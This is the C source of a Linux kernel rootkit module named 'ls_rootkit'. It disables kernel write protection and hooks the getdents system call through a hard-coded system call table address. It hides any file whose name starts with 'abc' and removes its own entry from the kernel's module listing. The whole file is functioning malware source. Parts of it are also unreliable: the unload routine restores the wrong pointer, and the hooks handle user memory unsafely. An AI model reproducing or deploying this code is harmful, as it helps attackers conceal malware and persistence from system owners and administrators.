#include <linux/kernel.h>
#include <linux/module.h>
#include <asm/unistd.h>
#include <linux/highmem.h>
#include <linux/semaphore.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include <linux/fs.h>

#define SYS_ENTRY 78 
#define DISABLE (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE (write_cr0(read_cr0() | (0x10000)))
#define HIDE_PREFIX "abc"
#define MODULE_NAME "ls_rootkit"
#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX)-1)

//struct file_operations* proc_modules_operations = (struct file_operations*)0x$1;

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

void **sys_call_table;
asmlinkage long (*original_getdents) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

asmlinkage long (*original_proc_module_read) (struct file *, char __user *, size_t, loff_t *);
// proc modules operations address 0xffffffff81a1a0a0

struct file_operations *proc_module_operations;

asmlinkage long modified_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
        struct linux_dirent* ent;
        long ret = original_getdents(fd, dirent, count);
        printk("ls_rootkit : sys_getdents_new :  number of bytes returned by getdents() : %ld\n",ret);
        //long ret = original_getdents(fd, dirent, count);
        char* dbuf;
        int dir_number=1;
        if (ret <= 0) {
                return ret;
        }
        dbuf = (char*)dirent;
        // go through the entries, looking for one that has our prefix
        for (boff = 0; boff < ret;) {
                ent = (struct linux_dirent*)(dbuf + boff);
                printk("ls_rootkit : sys_getdents_new : size of dirent struct no %d: %ld\n",dir_number,ent->d_reclen);
                if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
                        || (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
                        // remove this entry by copying everything after it forward
                        printk("ls_rootkit : sys_getdents_new : if block : dirent char contents : %s\n",ent->d_name);
                        memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
                        // and adjust the length reported
                       dir_number++;
                        ret -= ent->d_reclen;
                } else {
                        // on to the next entry
                        printk("ls_rootkit : sys_getdents_new : else block : dirent char contents : %s\n",ent->d_name);
                        boff += ent->d_reclen;
                        dir_number++;
                }
        }

        return ret;
}

ssize_t modified_proc_module_read(struct file *f, char __user *buf, size_t len, loff_t *offset) {
	char* bad_line = NULL;
	char* bad_line_end = NULL;
	ssize_t ret = original_proc_module_read(f, buf, len, offset);
	// search in the buf for MODULE_NAME, and remove that line
	bad_line = strnstr(buf, MODULE_NAME, ret);
	if (bad_line != NULL) {
		// find the end of the line
		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
			if (*bad_line_end == '\n') {
				bad_line_end++; // go past the line end, so we remove that too
				break;
			}
		}
		// copy over the bad line
		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
		// adjust the size of the return value
		ret -= (ssize_t)(bad_line_end - bad_line);
	}
	
	return ret;
}

static int __init begin_module(void)
{
        printk(KERN_INFO "************************************MODULE LOAD*************************************");
        sys_call_table = (void**)0xffffffff81a001c0;
	printk("ls_rootkit : executing line proc_module_operations = (struct file_operations *)\n");
	proc_module_operations = (struct file_operations*)0xffffffff81a1a0a0;
        DISABLE;
        original_getdents=(sys_call_table)[SYS_ENTRY];
	printk("ls_rootkit : executing line original_proc_module_read= proc_module_operations->read\n");
	original_proc_module_read = proc_module_operations->read;
        sys_call_table[SYS_ENTRY] = (void*)&modified_getdents;
	proc_module_operations->read = modified_proc_module_read;
        ENABLE;
	printk("ls_rootkit : executing proc_module_operations->read = modified_proc_module_read\n");
        return 0;
}

static void __exit exit_module(void)
{
        printk(KERN_INFO "************************************MODULE UNLOAD*************************************");
        DISABLE;
        sys_call_table[SYS_ENTRY] =(void*)original_getdents;
	proc_module_operations->read =  (void*)&original_proc_module_read;
        ENABLE;
}

MODULE_AUTHOR("Abikamet Nathan");
MODULE_LICENSE("GPL");

module_init(begin_module);
module_exit(exit_module);
